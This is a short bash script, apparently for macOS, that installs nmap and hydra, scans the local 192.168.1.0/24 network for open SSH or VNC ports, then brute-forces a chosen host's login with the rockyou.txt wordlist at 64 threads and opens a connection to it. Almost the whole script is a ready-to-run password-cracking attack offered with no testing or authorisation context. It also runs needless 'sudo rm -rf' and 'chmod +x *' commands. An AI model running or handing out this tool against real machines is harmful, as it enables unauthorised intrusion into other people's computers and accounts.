#!/bin/bash
sudo rm -rf output.txt
clear
echo "Loading..."
for ((k = 0; k <= 10; k++)); do
    echo -n "[ "
    for ((i = 0; i <= k; i++)); do echo -n "###"; done
    sleep 1
    for ((j = i; j <= 10; j++)); do echo -n "   "; done
    v=$((k * 10))
    echo -n " ] "
    echo -n "$v%" $'\r'
done
echo
chmod +x *

clear
echo 'Starting...'

function run() {
    brew install hydra && brew install nmap
    clear
    read -p "Do you want SSH(22) or VNC(5900). To see all type (ALL): " service

    if [[ $service == "ALL" ]]; then
        sudo nmap -sS 192.168.1.1/24 --open

    elif [[ $service == "all" ]]; then
        sudo nmap -sS 192.168.1.1/24 --open

    else
        sudo nmap -sS 192.168.1.1/24 -p $service --open
    fi

    echo "To crack VNC(5900) type 'NONE' in the input username"
    read -p "input username: " user
    read -p "input hostname: " host

    if [ $user == "NONE" ]; then
        hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host
        open vnc://$host
    else
        hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host
        open ssh $user@$host
    fi
}
run
